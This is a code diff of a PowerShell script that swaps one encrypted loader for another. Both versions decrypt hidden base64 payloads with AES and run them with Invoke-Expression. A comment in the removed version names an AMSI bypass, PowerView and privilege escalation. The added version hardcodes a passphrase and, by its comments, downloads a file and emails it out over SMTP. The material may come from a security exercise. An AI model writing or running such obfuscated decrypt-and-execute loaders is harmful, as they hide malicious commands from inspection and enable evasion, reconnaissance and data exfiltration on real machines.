@@ -1,30 +1,50 @@
-function D {
-    param($e, $k, $i)
-    $a = [System.Security.Cryptography.Aes]::Create()
-    $a.Key = $k
-    $a.IV = $i
-    $a.Padding = "PKCS7"
-    $d = $a.CreateDecryptor()
-    $b = [Convert]::FromBase64String($e)
-    $m = New-Object IO.MemoryStream
-    $c = New-Object Security.Cryptography.CryptoStream($m, $d, 'Write')
-    $c.Write($b, 0, $b.Length)
-    $c.Close()
-    [Text.Encoding]::UTF8.GetString($m.ToArray())
+# first.txt
+
+function Decrypt-String {
+    param(
+        [string]$CipherTextBase64,
+        [string]$Password
+    )
+    # derive 256-bit key = UTF8(password padded with spaces to 32 bytes)
+    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes( ($Password + ' ' * 32).Substring(0,32) )
+    # zero IV
+    $iv = New-Object byte[] 16
+
+    $cipherBytes = [Convert]::FromBase64String($CipherTextBase64)
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Mode    = 'CBC'
+    $aes.Padding = 'PKCS7'
+    $aes.Key     = $keyBytes
+    $aes.IV      = $iv
+
+    $decryptor = $aes.CreateDecryptor()
+    $ms = New-Object System.IO.MemoryStream(,$cipherBytes)
+    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
+    $sr = New-Object System.IO.StreamReader($cs)
+    $plain = $sr.ReadToEnd()
+    $sr.Close(); $cs.Close(); $ms.Close()
+    return $plain
 }
 
-# AES Key & IV
-$k = [Convert]::FromBase64String("Q3K1OxDixc03IRcJusRx7mbJX15GuNORMw2PuFevUfA=")
-$i = [Convert]::FromBase64String("kXHMQaoW9ayabOL5BKBI3w==")
+$EncryptedCommands = @(
+    # 1) Download the "Have I Been Pwned?" PDF to Desktop
+    'JW4aQlCGWRtdllKiVQ1gzc3+EkqS38RI5ZOLuKRwv0hxxeeJOq6e7I2BXGuLvibZSeC4epGTZlwx+7Hs
+VUI4ewFyR2p1GdrCnxnCJjSHzucqlrjrilZl1gxQOzB56UY+VNW2GLU6w7s3srkcHsGDbmgVDN/lpSw+
+LWTNXl3llgkeesYoM4/4mxXube+82r8ktPaAxrXLOOgpiI79w/oE2w==',
 
-# Encrypted Payload (AMSI bypass, PowerView, priv esc, PDF drop)
-$p = @'
-FTx0G9FBoS6ruxqM5MCgTmRFKxyMicaeMitycYvEH/fuxKXl8mwg32o5OvogW5fWSl8SjHVI7PoWYZ2EkeP1PF8UOjSsU0B61trqYDkJikqRCRRXgTGpHtPtfBz/Ke+Geow7XGG3u/5wmxCT8q0OGEPymUCs+z9ufjxYaWJxKJdz71rXtzBTFHweepH0KxwWCR720DRHkejdTpzyf2qJ2P5LYGxEZ46S2yiq/b++WrZx0XBH+ce3kuR0B9G3HAV5NG30Y1+cBcz2wEoWWcosehaH9kVcv72sAqKIq+spINdUML0TOBghbqR3Dha5KeVPvZDrWuqGuLoVmYx4ecyLv+LPVXTvLkf1dJrOSBAvSFZ8w4bQ999IoilcN5BJEiLpNw2b7XGoLvpPSAZlIAsq8Oj5lp7I0+cbpchDeLPf+1QbazX+0c8OUkGIlu0FVh8Pfg8VKsUtDvMZdEcP8tCx63MuIpC1HairCrDRObCBo+528PXqteLnmD2lBS55dWRaTwF/lFp92+crS45fUPhPooSWAJiWUGDyYxtI2BGmHOnSCh3VKVCptr4J29JiGG5LBsKW4OQYPXaLGFFJpF320yNihXw6mcdF+Xaw77VNosrlt8KyXsdDNgT0PiOBV4vvOY6bJbawJJyoEQvmJnnfmdTGSPgOQsU9ikWtRNAVr+HC9l75FVrbU9rMdzwS77UCuN6YAUlp6X0K3jXhNwV0+6k3rh463bLN8hcuOO/eQwmlvBTdniE3gn2/oM6X0nbjKzPEVw/MML5Hz/dSVnz4O8VK2sLEtvIEGq4davcnLUY8P5eVSYDLc+6aAm319zPbqVEKVUaIPa9Pl2UMsYhTWzlxiEEvodi1sxmgsm6VekRX2EAw1mI003EjtaYr8jzLqy/X34V7XvWMtw4hySEymJj3O6WSipFYiEbOWji9cxB9pZpZ9k0aNRAxr7UVmNVAc1pg3TDGwLAOxKYujYZtNCu0cjJJDlvQvUt+WX3g
-'@
+    # 2) Email it via Gmail SMTP (using placeholder app-password)
+    'IdA1lvu7W2VodcdTpK/u7iS+t1gL23IxAMfZn803o1HwNMxmoAkp3MtlKrLHiwVp94tEVhsLCLqt47GS
+JJ5Re7LbzJQs8Ao0LtApQUi9FEOSQfLfWc2ZpK3JFs1mkS339FIuZ74ckNof/qDzk6hivTYujTigGFuX
+j/7tN1plHkMkMCRtuwls7ajmGjZFPsaFE4in06vdUfH9y9+EkbBvmd8obVde13XNatDxsU3tyNBL+7Lg
+LckdoqO+q0lA6+diGfoU4AZQ+2T6mb3Z/D2I+6CNDa4kXLaH0fUdTsc5gfnZrjbOGKa3+xmqz3V385xK
+V0FiiyqpGB6qF0fqVaOSH7vmBsyJqu4LgB85qFts0QNUkA2+O7YT93MOJO+1UDUHap6g8UtQLXegIadL
+iL3c0lkKpBUu5T4AyzakDAr028tgwFdY+rqtEHX+nzTq/++7ckuTXORJNixeBKHFGRLCuyp/Qufd9igV
+90YBpG5SlKVElA0xsaU+Mo4/IdIVFm63dU2U4mf060TkjFFuS1+NEpUdLodA/mwXnBpCi4L7ffj8MFHu
+iVSyQwEd1bwSbpvIXT2IKFDRLb/hdeOkOYj+jngyfT7xwuMW43AtEsMwaCU='
+)
 
-try {
-    $s = D $p $k $i
-    iex $s
-} catch {
-    Write-Error "[-] Decryption or execution failed: $_"
+$passphrase = 'Junade Ali'
+foreach ($blob in $EncryptedCommands) {
+    $cmd = Decrypt-String $blob $passphrase
+    Invoke-Expression $cmd
 }
